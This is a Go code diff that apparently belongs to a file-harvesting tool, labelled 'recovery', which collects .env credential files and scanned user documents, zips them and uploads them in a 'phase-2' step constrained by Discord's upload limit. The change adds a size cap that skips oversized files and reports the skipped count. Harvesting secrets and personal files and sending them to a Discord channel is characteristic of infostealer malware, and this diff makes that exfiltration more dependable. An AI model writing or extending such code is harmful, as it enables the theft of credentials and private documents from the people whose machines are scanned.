@@ -8,6 +8,9 @@ import (
 	"recovery/recovery"
 )
 
+// Skip individual scanned files larger than this in phase-2 upload (Discord 25MB limit).
+const maxScannedFileUploadSize = maxDiscordUpload - 3*1024*1024
+
 func isEnvScannedFile(f recovery.FileResult) bool {
 	name := strings.ToLower(f.Name)
 	if name == ".env" || strings.HasPrefix(name, ".env.") {
@@ -49,15 +52,18 @@ func appendEnvFileEntries(entries []archiveEntry, p *harvestPayload, seen map[st
 	return entries
 }
 
-func buildScannedFileEntries(p *harvestPayload) []archiveEntry {
+func buildScannedFileEntries(p *harvestPayload) (entries []archiveEntry, skippedLarge int) {
 	if p == nil || p.Result == nil {
-		return nil
+		return nil, 0
 	}
 
-	var entries []archiveEntry
 	usedZip := make(map[string]int)
 	for _, f := range p.Result.Files {
 		if isEnvScannedFile(f) {
+			continue
+		}
+		if f.Size > maxScannedFileUploadSize {
+			skippedLarge++
 			continue
 		}
 		zipPath := uniqueFolder(scannedFileZipPath(f), usedZip)
@@ -66,7 +72,7 @@ func buildScannedFileEntries(p *harvestPayload) []archiveEntry {
 			diskPath: f.Path,
 		})
 	}
-	return entries
+	return entries, skippedLarge
 }
 
 func envFileZipPath(fullPath, name string) string {
@@ -85,6 +91,10 @@ func scannedFileZipPath(f recovery.FileResult) string {
 	return fmt.Sprintf("files/%s/%s", sanitizeFilename(dir), f.Name)
 }
 
-func scannedFilesSummary(count int) string {
-	return fmt.Sprintf("Scanned files: %d\nPDF, TXT, images, documents, and other matched files.", count)
+func scannedFilesSummary(count, skippedLarge int) string {
+	summary := fmt.Sprintf("Scanned files: %d\nPDF, TXT, images, documents, and other matched files.", count)
+	if skippedLarge > 0 {
+		summary += fmt.Sprintf("\nSkipped %d file(s) over %d MB (Discord upload limit).", skippedLarge, maxScannedFileUploadSize/(1024*1024))
+	}
+	return summary
 }
